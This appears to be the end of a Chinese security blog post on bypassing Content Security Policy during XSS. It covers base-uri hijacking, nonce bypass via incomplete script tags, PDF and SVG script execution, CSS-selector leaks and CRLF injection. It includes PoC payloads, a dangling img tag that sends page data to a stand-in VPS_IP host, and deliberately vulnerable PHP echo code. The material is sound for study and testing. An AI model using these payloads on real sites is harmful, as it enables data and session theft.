+<h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><p>利用条件：script-src只使用nonce，没有额外设置base-uri，且页面引用存在相对路径的<code>&lt;script&gt;</code>标签<br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径<br>注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内</p>
+<h3 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h3><p>利用条件：可控点在合法script标签上方，且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;X-XSS-Protection:0&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>]<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&#x27;xxxxx&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-comment">//do some thing</span></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性d但在chrome中，虽然第二个<code>&lt;script</code>被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行<br>这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略<br><code>http://127.0.0.1/2.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code></p>
+<h3 id="object-src绕过（PDFXSS）"><a href="#object-src绕过（PDFXSS）" class="headerlink" title="object-src绕过（PDFXSS）"></a>object-src绕过（PDFXSS）</h3><p>利用条件：没有设置object-src，或者object-src没有设置为’none’，pdf用的是chrome的默认解析器</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>]<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>在CSP标准里面，有一个属性是object-src，它限制的是<code>&lt;embed&gt;</code> <code>&lt;object&gt;</code> <code>&lt;applet&gt;</code>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束<br>PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;embed <span class="hljs-attribute">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attribute">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//vps_ip/123.pdf&quot;</span>&gt;&lt;/embed&gt;<br></code></pre></td></tr></table></figure>
+<p>pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等</p>
+<h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><p>利用条件：可以上传svg图片</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">svg</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Layer_1&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100px&quot;</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">&quot;0 0 751 751&quot;</span> <span class="hljs-attr">enable-background</span>=<span class="hljs-string">&quot;new 0 0 751 751&quot;</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;image0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;751&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;751&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;0&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>]<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>flag&#123;0xffff&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的<code>&lt;img</code>标签来将数据带出<br><code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//VPS_IP?a=</code><br>chrome下不会成功</p>
+<h3 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/162445.html">https://www.freebuf.com/articles/web/162445.html</a><br>大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;img-src *&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>]<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;flag&#123;0xffff&#125;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>意思是当input的value值以6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位</p>
+<h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/pentesting-web/crlf-0d-0a#http-tou-zhu-ru">https://book.hacktricks.xyz/v/cn/pentesting-web/crlf-0d-0a#http-tou-zhu-ru</a><br>通过利用CRLF注入，攻击者还可以插入HTTP头，这可能用于破坏安全机制，如浏览器的XSS过滤器或同源策略。这使得攻击者可以获取敏感信息，如CSRF令牌。他还可以设置Cookie，这可能被利用来登录受害者的帐户，或者利用其他无法利用的跨站脚本（XSS）漏洞。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/12/Script-Gadgets/" title="2023/10/12：moremore xss：各种xss绕过">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023/10/12：moremore xss：各种xss绕过</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/29/Floyd%E7%AE%97%E6%B3%95/" title="2023/09/29：Floyd算法">
+                        <span class="hidden-mobile">2023/09/29：Floyd算法</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
